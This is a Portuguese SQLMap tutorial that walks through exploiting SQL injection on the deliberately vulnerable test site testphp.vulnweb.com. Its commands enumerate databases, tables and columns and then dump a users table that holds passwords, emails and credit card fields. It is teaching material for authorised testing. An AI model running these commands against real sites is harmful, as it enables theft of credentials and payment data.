# Tutorial SQLMap - Extração de Dados de um Banco de Dados

O SQLMap é uma ferramenta de teste de penetração que automatiza a detecção e exploração de vulnerabilidades de injeção SQL em aplicativos da web. Neste tutorial, vamos explorar como usar o SQLMap para extrair dados de um banco de dados em um site de teste vulnerável.

**Nota importante: O uso do SQLMap em alvos sem consentimento prévio é ilegal e antiético. Certifique-se de obter permissão adequada antes de realizar qualquer teste de penetração.**

## Passo 1: Preparação

Antes de começarmos, certifique-se de que você tenha o SQLMap instalado. Você pode obtê-lo em [https://sqlmap.org/](https://sqlmap.org/).

## Passo 2: Identificação de uma Vulnerabilidade

Suponhamos que você já tenha identificado uma possível vulnerabilidade de injeção SQL em um site de teste, especificamente na URL `http://testphp.vulnweb.com/artists.php?artist=3`. Vamos usar essa URL como exemplo.

## Passo 3: Enumeração de Bancos de Dados

O primeiro passo é descobrir quais bancos de dados estão disponíveis no sistema alvo. Para fazer isso, use o seguinte comando:

```shell
sqlmap -u http://testphp.vulnweb.com/artists.php\?artist=\3 --dbs
```


- `-u`: Especifica a URL de destino.
- `--dbs`: Indica que queremos enumerar bancos de dados.


A saída deste comando listará os bancos de dados disponíveis.

![resultado 1](https://i.ibb.co/4K2SJWp/resultado-comando-1.png)


## Passo 4: Enumeração de Tabelas

Após identificar o banco de dados de interesse (por exemplo, `acuart`), o próximo passo é enumerar as tabelas dentro desse banco de dados. Use o seguinte comando:

```shell
sqlmap -u http://testphp.vulnweb.com/artists.php\?artist=\3 -D acuart --tables
```

- `-D`: Especifica o banco de dados alvo.
- `--tables`: Indica que queremos enumerar tabelas.

A saída deste comando listará as tabelas disponíveis no banco de dados.
![resultado 2](https://i.ibb.co/R9s72xs/resultado-comando-2.png)


## Passo 5: Enumeração de Colunas

Depois de identificar a tabela de interesse (por exemplo, `users`), podemos enumerar as colunas dentro dessa tabela. Use o seguinte comando:

```shell
sqlmap -u http://testphp.vulnweb.com/artists.php\?artist=\3 -D acuart -T users --columns
```


- `-T`: Especifica a tabela alvo.
- `--columns`: Indica que queremos enumerar colunas.

A saída deste comando listará as colunas disponíveis na tabela.

![resultado 2](https://i.ibb.co/jVzn3f6/resultado-3.png)


## Passo 6: Extração de Dados

Agora que sabemos quais colunas queremos extrair (por exemplo, `name`, `address`, `cc`, `email`, `pass`, `phone`, `uname`), podemos usar o seguinte comando para extrair os dados:

```shell
sqlmap -u http://testphp.vulnweb.com/artists.php\?artist=\3 -D acuart -T users -C name,address,cc,email,pass,phone,uname --dump
```

- `-C`: Especifica as colunas a serem extraídas.
- `--dump`: Solicita que os dados da tabela sejam extraídos.

A saída deste comando exibirá os dados das colunas especificadas.

![resultado 2](https://i.ibb.co/NTJDnGP/resultado-4.png)


## Conclusão

O SQLMap é uma ferramenta poderosa para testar vulnerabilidades de injeção SQL em aplicativos da web e automatizar a extração de dados de bancos de dados. Certifique-se sempre de usar o SQLMap de forma responsável e ética, obtendo permissão adequada antes de realizar qualquer teste de penetração.
